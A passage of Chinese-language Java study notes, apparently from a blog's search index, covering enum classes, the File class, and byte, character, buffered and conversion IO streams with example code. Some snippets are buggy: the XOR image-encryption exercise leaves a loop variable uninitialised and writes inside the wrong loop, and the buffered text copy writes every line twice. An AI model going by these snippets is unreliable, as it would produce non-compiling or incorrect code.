System.out.println(spring1);\n        System.out.println(Season1.class.getSuperclass());\n\n        //values()\n        Season1[] values = Season1.values();\n        for (int i = 0; i < values.length; i++) {\n            System.out.println(values[i]);\n            values[i].show();\n        }\n\n\n        // valueOf(String objName): 根据提供objName, 返回枚举类中对象名是objName的对象\n        // 如果没有，则抛出异常\n        Season1 winter = Season1.valueOf(\"WINTER\");\n        System.out.println(winter);\n        winter.show();  //类实现了这个接口，对象就可以去调用\n\n    }\n\n\n}\n\n\n//jdk5.0之前：自定义枚举类\nclass Season{\n    //1.声明Season对象的属性\n    private final String seasonName;\n    private final String seasonDesc;\n\n    //2.私有化类的构造器, 并给对象属性赋值\n    private Season(String seasonName, String seasonDesc){\n        this.seasonName = seasonName;\n        this.seasonDesc = seasonDesc;\n    }\n\n    //3.提供当前枚举类的对象的多个对象  public static final\n    public static final Season SPRING = new Season(\"春天\", \"春暖花开\");\n    public static final Season SUMMER = new Season(\"夏天\", \"夏日炎炎\");\n    public static final Season AUTOM = new Season(\"秋天\", \"秋高气爽\");\n    public static final Season WINTER = new Season(\"冬天\", \"冰天雪地\");\n\n    //4.其他诉求：获取枚举类对象的属性\n    public String getSeasonName() {\n        return seasonName;\n    }\n\n    public String getSeasonDesc() {\n        return seasonDesc;\n    }\n\n    //4.其他诉求：提供toString()\n    @Override\n    public String toString() {\n        return \"Season{\" +\n                \"seasonName='\" + seasonName + '\\'' +\n                \", seasonDesc='\" + seasonDesc + '\\'' +\n                '}';\n    }\n\n\n\n}\n\n\ninterface Info{\n    void show();\n}\n\n// //jdk5.0，可以使用enum关键字定义枚举类(常用)\nenum Season1 implements Info{\n//    1.提供当前枚举类的帝乡，多个对象之间用,隔开\n    SPRING(\"春天\", \"春暖花开\"){\n    @Override\n    public void show() {\n        System.out.println(\"春天在哪里\");\n    }\n},\n    SUMMER(\"夏天\", \"夏日炎炎\"){\n        @Override\n        public void show() {\n            System.out.println(\"夏天在哪里\");\n        }\n    },\n    AUTOM(\"秋天\", \"秋高气爽\"){\n        @Override\n        public void show() {\n            System.out.println(\"秋天在哪里\");\n        }\n    },\n    WINTER(\"冬天\", \"冰天雪地\"){\n        @Override\n        public void show() {\n            System.out.println(\"冬天在哪里\");\n        }\n    };\n\n    //2.声明Season对象的属性\n    private final String seasonName;\n    private final String seasonDesc;\n\n    //2.私有化类的构造器, 并给对象属性赋值\n    private Season1(String seasonName, String seasonDesc){\n        this.seasonName = seasonName;\n        this.seasonDesc = seasonDesc;\n    }\n\n    //3.提供当前枚举类的对象的多个对象  public static final\n\n\n    //4.其他诉求：获取枚举类对象的属性\n    public String getSeasonName() {\n        return seasonName;\n    }\n\n    public String getSeasonDesc() {\n        return seasonDesc;\n    }\n\n    //在enum类中实现抽象方法\n    @Override\n    public void show() {\n        System.out.println(\"这是一个季节\");\n    }\n\n    //4.其他诉求：提供toString()\n}\n\n\n```\n\n\n\n\n\n","tags":["学习记录"],"categories":["Java学习"]},{"title":"Java学习之IO流","url":"%2Fposts%2F62588%2F","content":"\n\n\n\n\n### File类的使用\n\n- `java.io.File`类:**文件**和**文件目录路径**的抽象表示形式，与平台无关\n- File能新建、删除、重命名文件和目录，但 File不能访问文件内容本身。如果需要访问文件内容本身，则需要使用输入/输出流。\n- **想要在Java程序中表示一个真实存在的文件或目录，那么必须有一个File对象，但是Java程序中的一个File对象，可能没有一个真实存在的文件或目录。**\n- File对象可以作为参数传递给流的构造器\n\n\n\n```java\n * 1. File类的一个对象，代表一个文件或一个文件目录(俗称:文件夹)\n * 2. File类声明在java.io包下\n * 3.File类中涉及到关于文件或文件目录的创建、删除、重命名、修改时间、文件大小等方法，并未涉及到写入或读取文件内容的操作。如果需要读取或写入文件内容，必须使用Io流来完成。\n * 4.后续File类的对象通常会作为参数传递到流的构造器中，指明读取或写入的\"终点\"\n```\n\n\n\n\n\n#### 创建File类的实例:\n\n\n\n**常用构造器：**\n\n```bash\n# public File(String pathname)\n以pathname为路径创建File对象，可以是绝对路径或者相对路径，如果pathname是相对路径，则默认的当前路径在系统属性user.dir中存储。\n    绝对路径:是一个固定的路径,从盘符开始\n    相对路径:是相对于某个位置开始\n\n# public File(String parent,String child)\n以parent为父路径，child为子路径创建File对象。\n\n# public File(File parent,String child)\n根据一个父File对象和子文件路径创建File对象\n\n```\n\n\n\n**路径分隔符：**\n\n- 路径中的每级目录之间用一个路径分隔符隔开\n- 路径分隔符和系统有关:\n  - windows和DOS系统默认使用`\\`来表示\n  - UNIX和URL使用`/`来表示\n- Java程序支持跨平台运行，因此路径分隔符要慎用。\n- 为了解决这个隐患，File类提供了一个常量:`public static final String separator`。根据操作系统，动态的提供分隔符。举例: \n\n```java\nFile file1 = new File(\"d:\\\\hello.txt\");\nFile file2 = new File(\"d:\" + File.separator + \"hello.txt\");\nFile file3 = new File(\"d:/hello.txt\");\n```\n\n\n\n```java\n/*\n    1.如何创建File类的实例\n        File(String filePath)\n        File(String parentPath, String childPath)\n        File(File parentPath, String childPath)\n\n    2.相对路径、绝对路径\n\n    3.路径分隔符\n\n    * */\n@Test\npublic void test(){\n    //构造器1：\n    //相对路径(相较于某个路径下，指明的路径:这里的IDEA中相对于当前module中)\n    File file1 = new File(\"hello.txt\");\n    //绝对路径\n    File file2 = new File(\"d:\\\\hello.txt\");\n    // 为了解决不同操作系统下路径分隔符的隐患，File类提供了一个常量:`public static final String separator`。根据操作系统，动态的提供分隔符\n    File file3 = new File(\"d:\" + File.separator + \"hello.txt\");\n\n    //构造器2：\n    File file4 = new File(\"d:\\\\Code\", \"JavaCode\");\n\n    //构造器3：\n    File file5 = new File(file4, \"1.txt\");\n\n}\n\n```\n\n\n\n\n\n#### 常用方法\n\n**File类的获取功能**\n\n```bash\npublic String getAbsolutePath():获取绝对路径\npublic String getPath():获取路径\npublic String getName():获取名称\npublic String getParent():获取上层文件目录路径。若无，返回null\npublic long length():获取文件长度（即:字节数）。不能获取目录的长度。\npublic long lastModified():获取最后一次的修改时间，毫秒值\n# 以下两个适用于文件目录\npublic String[] list():获取指定目录下的所有文件或者文件目录的名称数组\npublic File[] listFiles():获取指定目录下的所有文件或者文件目录的File数组\n```\n\n\n\n**File类的重命名功能**\n\n```bash\npublic boolean renameTo(File dest):把文件重命名为指定的文件路径\n```\n\n\n\n**File类的判断功能**\n\n```bash\npublic boolean isDirectory():判断是否是文件目录\npublic boolean isFile():判断是否是文件\npublic boolean exists() :判断是否存在\npublic boolean canRead():判断是否可读\npublic boolean canWrite():判断是否可写\npublic boolean isHidden():判断是否隐藏\n```\n\n\n\n**File类的创建功能:**\n\n```bash\npublic boolean createNewFile():创建文件。若文件存在，则不创建，返回false\npublic boolean mkdir() :创建文件目录。如果此文件目录存在，就不创建了。如果此文件目录的上层目录不存在，也不创建。\npublic boolean mkdirs():创建文件目录。如果上层文件目录不存在，一并创建\n\n# 注意事项:如果你创建文件或者文件目录没有写盘符路径，那么，默认在项目路径下。\n```\n\n\n\n**File类的删除功能:**\n\n```bash\npublic boolean delete():删除文件或者文件夹\n\n# 删除注意事项:\nJava中的删除不走'回收站'。\n要删除一个文件目录，请注意该文件目录内不能包含文件或者文件目录\n```\n\n\n\n代码：\n\n```java\n   @Test\n    public void test1(){\n        File file1 = new File(\"hello.txt\");\n        File file2 = new File(\"d:\\\\io\\\\1.txt\");\n\n        System.out.println(file1.getAbsolutePath());\n        System.out.println(file1.getName()); //如果只是在内存中，没有创建，获取的值是null\n        System.out.println(file1.getParent()); // 相对路径一般是获取不到父级目录的\n        System.out.println(file1.getAbsoluteFile());\n        System.out.println(file1.length());\n        System.out.println(file1.lastModified());\n        System.out.println(\"***********\");\n\n        System.out.println(file2.getAbsolutePath()); // d:\\io\n        System.out.println(file2.getName());  // d:\\io\n        System.out.println(file2.getParent());  // d:\\io\n        System.out.println(file2.getAbsoluteFile()); // d:\\io\\1.txt\n        System.out.println(file2.length());\n        System.out.println(new Date(file2.lastModified()));\n        System.out.println(\"***********\");\n\n        // # 适用于文件目录\n        File file3 = new File(\"E:\\\\Code\");\n        //获取文件名\n        String[] list = file3.list();\n        for (String s: list){\n            System.out.println(s);\n        }\n        //绝对路径的形式显示出来\n        File[] list2 = file3.listFiles();\n        for (File f: list2){\n            System.out.println(f);\n        }\n\n\n        //重命名\n//        public boolean renameTo(File dest):把文件重命名为指定的文件路径\n        //要想返回true，需保证：file4在硬盘中存在，且file5不能存在\n        File file4 = new File(\"d:\\\\io\\\\2.txt\");\n        File file5 = new File(\"d:\\\\io\\\\222222.txt\");\n        //file4命名为file5(file4就没了，file5就存在了)\n        boolean renameTo = file4.renameTo(file5);\n        System.out.println(renameTo);\n\n\n\n\n//        public boolean isDirectory():判断是否是文件目录\n        System.out.println(file3.isDirectory());\n//        public boolean isFile():判断是否是文件\n        System.out.println(file3.isFile());\n//        public boolean exists() :判断是否存在\n        System.out.println(file3.exists());\n//        public boolean canRead():判断是否可读\n        System.out.println(file3.canRead());\n//        public boolean canWrite():判断是否可写\n        System.out.println(file3.canWrite());\n//        public boolean isHidden():判断是否隐藏\n        System.out.println(file3.isHidden());\n\n\n    }\n\n\n    /*\n   真正在硬盘上创建、删除\n\n    1.File类的创建功能:\npublic boolean createNewFile():创建文件。若文件存在，则不创建，返回false\npublic boolean mkdir() :创建文件目录。如果此文件目录存在，就不创建了。如果此文件目录的上层目录不存在，也不创建。\npublic boolean mkdirs():创建文件目录。如果上层文件目录不存在，一并创建\n\n# 注意事项:如果你创建文件或者文件目录没有写盘符路径，那么，默认在项目路径下。\n\n\n\n  2.File类的删除功能:\n\npublic boolean delete():删除文件或者文件夹\n\n# 删除注意事项:\nJava中的删除不走'回收站'。\n要删除一个文件目录，请注意该文件目录内不能包含文件或者文件目录\n\n\n\n     */\n    @Test\n    public void test2() throws IOException {\n        //文件创建和删除\n        File file = new File(\"d:\\\\io\\\\2.txt\");\n        if(!file.exists()){ //如果不存在就创建\n            file.createNewFile();\n            System.out.println(\"创建ok\");\n        }else{ //如果存在，就删除\n            file.delete();\n            System.out.println(\"delete ok\");\n        }\n\n        //目录的创建和删除\n        File pathName = new File(\"d:\\\\io\\\\xx\\\\yy\");\n        if(!pathName.exists()){ //如果不存在就创建\n            boolean mk = pathName.mkdir();\n            //boolean mk = pathName.mkdirs();  //如果上级目录不存在就递归创建目录\n            if(mk){\n                System.out.println(\"目录创建ok\");\n            }\n\n        }else{ //如果存在，就删除\n            pathName.delete(); // 注意该文件目录内不能包含文件或者文件目录\n            System.out.println(\"目录delete ok\");\n        }\n\n    }\n```\n\n\n\n\n\n\n\n\n\n### IO流原理及流的分类\n\n- l/O是Input/Outpqt的缩写，I/O技术是非常实用的技术，用于**处理设备之间的数据传输**。如读/写文件，网络通讯等。\n- Java程序中，对于数据的输入/输出操作以“**流(stream)**”的方式进行。\n- java.io包下提供了各种“流”类和接口，用以获取不同种类的数据，并通过**标准的方法**输入或输出数据。\n\n\n\n- 输入input: 读取外部数据（磁盘、光盘等存储设备的数据）到程序（内存)中。\n- 输出output: 将程序（内存)数据输出到磁盘、光盘等存储设备中。\n- 我们要站在程序的角度\n\n\n\n#### 流的分类\n\n- 按操作**数据单位**不同分为:**字节流**(8 bit -- bytes)，**字符流**(16 bit --- char)\n\n- 按数据流的**流向**不同分为: 输入流(数据--->程序)，输出流(程序-->数据)\n\n- 按流的**角色**的不同分为:节点流(直接作用在文件上的)，处理流(这个流的对象作为外面的流的参数，包了一层，加快了传输速度)\n\n  | （抽象基类） |    字节流    | 字符流 |\n  | :----------: | :----------: | :----: |\n  |    输入流    | InputStream  | Reader |\n  |    输出流    | OutputStream | Writer |\n\n1. Java的IO流共涉及40多个类，实 际上非常规则，都是从如上4个抽象基类派生的。\n2. 由这四个类派生出来的子类名称都是以其父类名作为子类名后缀（比如后缀带Stream的都是`字节`，后缀带`Reader`或`Writer`的都是`字节`）。\n\n![IO流体系](http://image.xpshuai.cn/JavaIO%E6%B5%81%E4%BD%93%E7%B3%BB.png)\n\n> 深色的为重点\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n### 节点流(或文件流)\n\n#### 字符流\n\n- FileReader\n- FileWriter\n\n字符流不能读取图片等字节数据\n\n\n\n代码：\n\n```java\n/*\n字符流：\nFileReader\nFileWriter\n\n\nNote:\n1. read()的理解:返回读入的一个字符。如果达到文件末尾，返回-1\n2．异常的处理:为了保证流资源一定可以执行关闭操作。需要使用try-catch-finally处理\n3. 读入的文件一定要存在\n\n     */\n    @Test\n    public void test(){\n        //如果是在main方法中，则相对路径是相对于当前工程\n        //【功能】：读取文件内容到程序中，并输出到控制台\n\n        FileReader fr = null;\n        try{\n            //1.实例化File类的对象，指明要操作的文件\n            File file = new File(\"d:\\\\io\\\\1.txt\");\n            //2.提供具体的流\n            fr = new FileReader(file);\n            //3.数据的读入\n            //read():返回读入的一个字符，如果达到文件末尾，返回-1\n            //方式1：\n//        int data = fr.read();  // 返回-1表示读完了\n//        while (data != -1){\n//            System.out.println((char) data);\n//            data = fr.read(); //继续向后读\n//        }\n            //方式2:\n            int data;\n            while ((data = fr.read()) != -1){\n                System.out.println((char) data);\n            }\n\n        }catch (Exception e) {\n            e.printStackTrace();\n        }finally {\n            //4.流的关闭\n            try{\n                if(fr != null){\n                    fr.close();\n                }\n            }catch (Exception e){\n                e.printStackTrace();\n            }\n        }\n    }\n\n\n/*\nFileReader(char[] cbuf)读入数据\n对read()操作升级: 使用read的重载方法\n\n */\n    @Test\n    public void test1(){\n        FileReader fr = null;\n        try{\n            //1.实例化File类的对象，指明要操作的文件\n            File file = new File(\"d:\\\\io\\\\1.txt\");\n            //2.FileReader的实例化，提供具体的流\n            fr = new FileReader(file);\n            //3.数据的读入操作（难点）：\n            char[] cbuf = new char[5]; //每次读入cbuf数组长度个字符的个数，如果达到文件末尾则返回-1\n            int len;\n            while ((len = fr.read(cbuf)) != -1){\n                //方式1：\n                for (int i = 0; i < len; i++) {\n                    System.out.print(cbuf[i]);\n                }\n                //方式2：\n//                String str = new String(cbuf, 0,len); //从0开始每次取len个\n//                System.out.println(str);\n\n            }\n\n        }catch (Exception e) {\n            e.printStackTrace();\n        }finally {\n            //4.流资源的关闭\n            try{\n                if(fr != null){\n                    fr.close();\n                }\n            }catch (Exception e){\n                e.printStackTrace();\n            }\n        }\n    }\n\n\n    /*\n    FileWriter(): 从内存中写出数据到硬盘的文件中\n\n    1．输出操作，对应的FiLe是可以不存在的。\n        如果不存在，在输出的过程中，会自动创建此文件。\n        如果存在，默认参数append:false会对原有文件的覆盖; true则在原有文件基础上添加\n        即: 如果流使用的构造器是:FiLewriter(fiLe,false)/FiLewriter(fiLe):对原有文件的覆盖\n            如果流使用的构造器是:FiLewriter(file,true):不会对原有文件覆盖，而是在原有文件基础上追加内容\n     */\n    @Test\n    public void test2(){\n        FileWriter fw = null;\n        try{\n            // 1.提供File类的对象，指明写出到的文件\n            File file = new File(\"d:\\\\io\\\\11.txt\");\n            //2.提供FileWriter的对象，用于数据的写出\n            fw = new FileWriter(file, false);\n            //3.写出的操作\n            fw.write(\"hhh hhh hdaldk\\n\");\n            fw.write(\"hhh 222 hdaldk\\n\");\n        }catch (Exception e){\n            e.printStackTrace();\n        }finally {\n            try {\n                //4.流资源的关闭\n                fw.close();\n            }catch (Exception e){\n                e.printStackTrace();\n            }\n        }\n\n    }\n\n\n/*\n使用FileReader和FileWriter实现文本文件的复制\n\n */\n    @Test\n    public void test3() {\n        FileReader fr = null;\n        FileWriter fw = null;\n        try {\n            // 1.创建File类的对象，指明读入和写出的文件\n            File srcFile = new File(\"d:\\\\io\\\\1.txt\");\n            File dstFile = new File(\"d:\\\\io\\\\111.txt\");\n\n//        2.创建输入流和输出流的操作\n            fr = new FileReader(srcFile);\n            fw = new FileWriter(dstFile);\n\n//        3.数据的读入和写出操作\n            char[] cbuf = new char[5];\n            int len; //每次读入cbuf数组长度个字符的个数\n            while ((len = fr.read(cbuf)) != -1) {  //\n                fw.write(cbuf, 0, len); //每次写出len个字符\n            }\n//        4.关闭流资源\n            }catch(Exception e){\n                e.printStackTrace();\n            }finally{\n                try {\n                    if(fr != null){\n                        fr.close();\n                    }\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }finally {\n                    try {\n                        if(fw != null){\n                            fw.close();\n                        }\n                    } catch (Exception e) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n\n        }\n\n\n```\n\n\n\n\n\n\n\n#### 字节流\n\n- FileInputStream\n- FileOutputStream\n\n\n\n```java\n    /*\n字节流：\nFileInputStream\nFileOutputStream\n\n结论：FileInputStream\n对于文本文件，还是要用字符流\n对于图片等，还是要用字节流\n\n */\n    @Test\n    public void test4(){\n        FileInputStream fis = null;\n        try{\n            //1.造文件\n            File file = new File(\"d:\\\\io\\\\1.txt\");\n            //2.造流\n            fis = new FileInputStream(file);\n            //3.读数据\n            byte[] buffer = new byte[5];\n            int len; //记录每次读取的字节的个数\n            while ((len = fis.read(buffer)) != -1){\n                String str = new String(buffer,0, len);\n                System.out.println(str);  // 这样中文可能乱码，因为uft-8中文一个字是占3个字节\n            }\n\n\n//        File file = new File(\"d:\\\\io\\\\1.txt\");\n\n        }catch (Exception e){\n            System.out.println(e.getMessage());\n        }finally {\n            //4.关闭资源\n            try{\n                fis.close();\n            }catch (Exception e){\n                e.printStackTrace();\n            }\n\n        }\n\n\n    }\n\n/*\n FileOutputStream\n 实现对图片的复制操作\n 如果只是相对文本文件进行复制操作，也可以使用字节流\n */\n    @Test\n    public void test5(){\n        FileInputStream fis = null;\n        FileOutputStream fos = null;\n        try{\n            //1.造文件\n            File srcFile = new File(\"d:\\\\io\\\\1.png\");\n            File dstFile = new File(\"d:\\\\io\\\\2.png\");\n\n            //2.造流\n            fis = new FileInputStream(srcFile);\n            fos = new FileOutputStream(dstFile);\n\n            //3.复制的过程\n            byte[] buffer = new byte[10];\n            int len; //记录每次读入的字节的个数\n            while ((len = fis.read(buffer)) != -1){\n                fos.write(buffer, 0, len); // 每次写10个字节\n            }\n            System.out.println(\"复制ok.\");\n\n        }catch (Exception e){\n            System.out.println(e.getMessage());\n        }finally {\n            //4.关闭资源\n            try{\n                if(fis != null){\n                    fis.close();\n                }\n            }catch (Exception e){\n                e.printStackTrace();\n            }\n\n            try{\n                if(fos != null){\n                    fos.close();\n                }\n            }catch (Exception e){\n                e.printStackTrace();\n            }\n\n        }\n\n\n    }\n\n\n    //为了方便指定路径下文件的复制(封装为一个函数)\n    public void copyFile(String srcPath, String dstPath){\n        FileInputStream fis = null;\n        FileOutputStream fos = null;\n        try{\n            //1.造文件\n            File srcFile = new File(srcPath);\n            File dstFile = new File(dstPath);\n\n            //2.造流\n            fis = new FileInputStream(srcFile);\n            fos = new FileOutputStream(dstFile);\n\n            //3.复制的过程\n            byte[] buffer = new byte[1024];  // 并不是越大越好(太大了占内存大了，找个适中的)\n            int len; //记录每次读入的字节的个数\n            while ((len = fis.read(buffer)) != -1){\n                fos.write(buffer, 0, len); // 每次写10个字节\n            }\n            System.out.println(\"复制ok.\");\n\n        }catch (Exception e){\n            System.out.println(e.getMessage());\n        }finally {\n            //4.关闭资源\n            try{\n                if(fis != null){\n                    fis.close();\n                }\n            }catch (Exception e){\n                e.printStackTrace();\n            }\n\n            try{\n                if(fos != null){\n                    fos.close();\n                }\n            }catch (Exception e){\n                e.printStackTrace();\n            }\n\n        }\n\n    }\n\n\n    @Test\n    public void testCopy(){\n        long start = System.currentTimeMillis();\n\n        //可以直接调用我们封装好的复制文件的函数：\n        copyFile(\"d:\\\\io\\\\xiaodi.mp4\", \"d:\\\\io\\\\study.mp4\");   // 后面再学对于视频可以用缓冲流\n\n        long end = System.currentTimeMillis();\n\n        System.out.println(end - start);\n\n    }\n\n```\n\n\n\n\n\n\n\n### 处理流\n\n#### 1.缓冲流(使用的更多)\n\n> 开发中用缓冲流多，一般不用前面的字节流(FileInputStreamFile、OutputStream)\n\n\n\n- BufferedInputStream\n- BufferedOutputStream\n- BufferedReader\n- BufferedWriter\n\n\n\n**缓冲流作用：**提供流的读取、写入的速度\n\n----> 原因：提高读写速度的原因:内部提供了一个缓冲区\n\n**处理流,** 就是“套接”在已有的流的基础上。\n\n\n\n**缓冲流与节点流：**\n\n```\nBufferedInputStream\nBufferedOutputStream\n```\n\n```java\n/*\nBufferedInputStream\nBufferedOutputStream\n\n\n缓冲流作用：提供流的读取、写入的速度\n----> 原因：提高读写速度的原因:内部提供了一个缓冲区\n */\n    @Test\n    public void test6(){\n        //以非文本复制文件为例\n        bufferCopyFile(\"d:\\\\io\\\\xiaodi.mp4\", \"d:\\\\io\\\\xiaodi2.mp4\");\n\n\n    }\n    public void bufferCopyFile(String srcPath, String dstPath){\n        //缓冲流与字节流\n        FileInputStream fis = null;\n        FileOutputStream fos = null;\n        BufferedInputStream bis = null;\n        BufferedOutputStream bos = null;\n        try{\n            //1.造文件\n            File srcFile = new File(srcPath);\n            File dstFile = new File(dstPath);\n\n            //2.造流(处理流不能直接作用域文件上): 先造里层的流, 再造外层的流\n            //2.1造节点流\n            fis = new FileInputStream(srcFile);\n            fos = new FileOutputStream(dstFile);\n\n            //2.2造缓冲流\n            bis = new BufferedInputStream(fis);\n            bos = new BufferedOutputStream(fos);\n\n\n            //3.复制的过程: 读取，写入\n            byte[] buffer = new byte[10];  // 并不是越大越好(太大了占内存大了，找个适中的)\n            int len; //记录每次读入的字节的个数\n            while ((len = bis.read(buffer)) != -1){  // 用bis来read\n                bos.write(buffer, 0, len); // 用bos来write，每次写10个字节\n            }\n            System.out.println(\"复制ok.\");\n\n        }catch (Exception e){\n            System.out.println(e.getMessage());\n        }finally {\n            //4.关闭资源（要求:先关外层的流(处理流), 在关里层的流）\n            // 说明：在关闭外层流的同时，内层流也会自动关闭(我们可以省略不写了就)\n            try{\n                if(bis != null){\n                    bis.close();\n                }\n            }catch (Exception e){\n                e.printStackTrace();\n            }\n            try{\n                if(bos != null){\n                    bos.close();\n                }\n            }catch (Exception e){\n                e.printStackTrace();\n            }\n\n\n        }\n\n    }\n\n```\n\n\n\n**缓冲流与字符流：**（）\n\n```\nBufferedReader\nBufferedWriter\n```\n\n```java\n//以文本文件复制为例\n// BufferedReader、BufferedWriter\nbufferCopyTxtFile(\"d:\\\\io\\\\1.txt\", \"d:\\\\io\\\\11111.txt\");\n\n    \n\npublic void bufferCopyTxtFile(String srcPath, String dstPath){\n        //缓冲流与字符流\n\n        BufferedReader br = null;\n        BufferedWriter bw = null;\n        try{\n            //1.造文件、造流(熟练之后可以这样写在一起)\n            br = new BufferedReader(new FileReader(new File(srcPath)));\n            bw = new BufferedWriter(new FileWriter(new File(dstPath)));\n\n            //2.读取，写入(字符流)\n            //方式1：\n//            char[] cbuf = new char[1024];\n//            int len; //记录每次读入的个数\n//            while ((len = br.read(cbuf)) != -1){  // 用bis来read\n//                bw.write(cbuf, 0, len);\n////                bw.flush();\n//            }\n\n            //方式2：\n            String data;\n            while((data = br.readLine()) != null){ //一次读一行\n                //方法1：\n                bw.write(data + \"\\n\"); //data中不包含换行符\n                //方法2：\n                bw.write(data ); //data中不包含换行符\n                bw.newLine(); //提供换行操作\n            }\n\n\n\n            System.out.println(\"复制ok.\");\n\n        }catch (Exception e){\n            System.out.println(e.getMessage());\n        }finally {\n            //4.关闭资源（要求:先关外层的流(处理流), 在关里层的流）\n            // 说明：在关闭外层流的同时，内层流也会自动关闭(我们可以省略不写了就)\n            try{\n                if(br != null){\n                    br.close();\n                }\n            }catch (Exception e){\n                e.printStackTrace();\n            }\n            try{\n                if(bw != null){\n                    bw.close();\n                }\n            }catch (Exception e){\n                e.printStackTrace();\n            }\n\n\n        }\n\n    }\n\n```\n\n\n\n![几个IO流小汇总](http://image.xpshuai.cn/%E5%87%A0%E4%B8%AAIO%E6%B5%81%E5%B0%8F%E6%B1%87%E6%80%BB.png)\n\n\n\n**练习1**：实现图片加密操作\n\n```java\n//提示:\n//图片加密：\nFileInputStream fis = new FileInputStream(srcFile);\nFileOutputStream fos = new FileOutputStream(dstFile);\n\nbyte[] buffer = new byte[1024];  \nint len; //记录每次读入的字节的个数\n\nwhile ((len = fis.read(buffer)) != -1){ \n    for(int i; i<len; i++){\n        buffer[i] = (byte)(buffer[i]^5); //每位字节做了异或的运算\n        fos.write(buffer, 0, len);\n    }\n}\n\n\n//图片解密：\nFileInputStream fis = new FileInputStream(\"加密后的文件\");\nFileOutputStream fos = new FileOutputStream(dstFile);\n\nbyte[] buffer = new byte[1024];  \nint len; //记录每次读入的字节的个数\n\nwhile ((len = fis.read(buffer)) != -1){ \n    for(int i; i<len; i++){\n        buffer[i] = (byte)(buffer[i]^5); //每位字节做了异或的运算，还原\n        fos.write(buffer, 0, len);\n    }\n}\n\n\n```\n\n**练习1*2**：获取文本上**每个字符**出现的次数\n\n```java\n//提示:遍历文本的每一个字符;字符及出现的次数保存在Map中(key是字符,value是次数);将Map中数据写入文件\n\n\npackage cn.xpshuai.java3;\n\nimport org.junit.Test;\n\nimport java.io.*;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.Set;\n\n\n/**\n *\n * 思路：\n * 1.遍历文本每一个字符\n * 2.字符出现的次数存在Map中\n *\n * Map<Character,Integer> map = new HashMap<Character,Integer>();\n * map.put('a',18);\n * map.put('你',2);\n *\n * 3.把map中的数据写入文件\n *\n */\npublic class WordCount {\n    /*\n    说明：如果使用单元测试，文件相对路径为当前module\n          如果使用main()测试，文件相对路径为当前工程\n     */\n    @Test\n    public void testWordCount() {\n        FileReader fr = null;\n        BufferedWriter bw = null;\n        try {\n            //1.创建Map集合\n            Map<Character, Integer> map = new HashMap<Character, Integer>();\n\n            //2.遍历每一个字符,每一个字符出现的次数放到map中\n            fr = new FileReader(\"dbcp.txt\");\n            int c = 0;\n            while ((c = fr.read()) != -1) {\n                //int 还原 char\n                char ch = (char) c;\n                // 判断char是否在map中第一次出现\n                if (map.get(ch) == null) {\n                    map.put(ch, 1);\n                } else {\n                    map.put(ch, map.get(ch) + 1);\n                }\n            }\n\n            //3.把map中数据存在文件count.txt\n            //3.1 创建Writer\n            bw = new BufferedWriter(new FileWriter(\"wordcount.txt\"));\n\n            //3.2 遍历map,再写入数据\n            Set<Map.Entry<Character, Integer>> entrySet = map.entrySet();\n            for (Map.Entry<Character, Integer> entry : entrySet) {\n                switch (entry.getKey()) {\n                    case ' ':\n                        bw.write(\"空格=\" + entry.getValue());\n                        break;\n                    case '\\t'://\\t表示tab 键字符\n                        bw.write(\"tab键=\" + entry.getValue());\n                        break;\n                    case '\\r'://\n                        bw.write(\"回车=\" + entry.getValue());\n                        break;\n                    case '\\n'://\n                        bw.write(\"换行=\" + entry.getValue());\n                        break;\n                    default:\n                        bw.write(entry.getKey() + \"=\" + entry.getValue());\n                        break;\n                }\n                bw.newLine();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            //4.关流\n            if (fr != null) {\n                try {\n                    fr.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n\n            }\n            if (bw != null) {\n                try {\n                    bw.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n\n            }\n        }\n\n    }\n}\n\n    \n```\n\n\n\n\n\n\n\n#### 2.转换流\n\n> 转换流提供了在字节流和字符流之间的转换\n>\n> 属于字符流\n>\n> 作用：提供字节流与字符流之间的转换\n\n**Java API提供了两个转换流:**\n\n- **InputStreamReader**: 将lnputStream转换为Reader\n- **outputStreamWriter**:将Writer转换为OutputStream\n\n字节流中的数据都是字符时，转成字符流操作更高效。\n很多时候我们使用转换流来处理文件乱码问题。实现编码和解码的功能。\n\n![Java转换流](http://image.xpshuai.cn/Java%E8%BD%AC%E6%8D%A2%E6%B5%81.png)\n\n\n\n\n\n```java\npackage cn.xpshuai.java1;\n\nimport org.junit.Test;\n\nimport java.io.*;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-30 11:24\n * @功能：处理流2：转换流的使用\n *\n * 1.转换流：属于字符流\n * - InputStreamReader: 将字节的输入流InputStream转换为字符的输入流Reader\n * - outputStreamWriter:将字符的输出流Writer转换为字节的输出流OutputStream\n *\n * 2.解码：字节、字节数组 --> 字符数组、字符串\n *   编码：字符数组、字符串 --> 字节、字节数组\n *\n *\n * 3.字符集\n *\n *\n *\n */\npublic class InputStreamReaderTest {\n    /*\n    输入流\n    InputStreamReader\n     */\n    @Test\n    public void test() throws IOException {  //仍然需要try-catch，这里我偷懒一下\n        FileInputStream fis = new FileInputStream(new File(\"d:\\\\io\\\\1.txt\"));\n        InputStreamReader isr = new InputStreamReader(fis, \"UTF-8\"); //默认使用系统的字符集\n\n        char[] cbuf = new char[5];\n        int len;\n        while ((len = isr.read(cbuf)) != -1){\n            String str = new String(cbuf, 0, len);\n            System.out.println(str);\n        }\n        isr.close();\n\n    }\n\n    /*\n    输出流：outputStreamWriter\n    综合使用InputStreamReader和outputStreamWriter，读取，换个字符集，再写出去\n     */\n    @Test\n    public void test1() throws IOException {\n        //1.造文件、造流\n        FileInputStream fis = new FileInputStream(new File(\"d:\\\\io\\\\1.txt\"));\n        FileOutputStream fos = new FileOutputStream(new File(\"d:\\\\io\\\\1_gbk.txt\"));\n\n        InputStreamReader isr = new InputStreamReader(fis, \"UTF-8\"); //默认使用系统的字符集\n        OutputStreamWriter osw = new OutputStreamWriter(fos, \"gbk\");\n\n        //2.读取写入\n        char[] cbuf = new char[5];\n        int len;\n        while ((len = isr.read(cbuf)) != -1){\n            osw.write(cbuf, 0, len);\n        }\n\n        //3.关闭\n        isr.close();\n        osw.close();\n    }\n\n}\n\n```\n\n\n\n##### 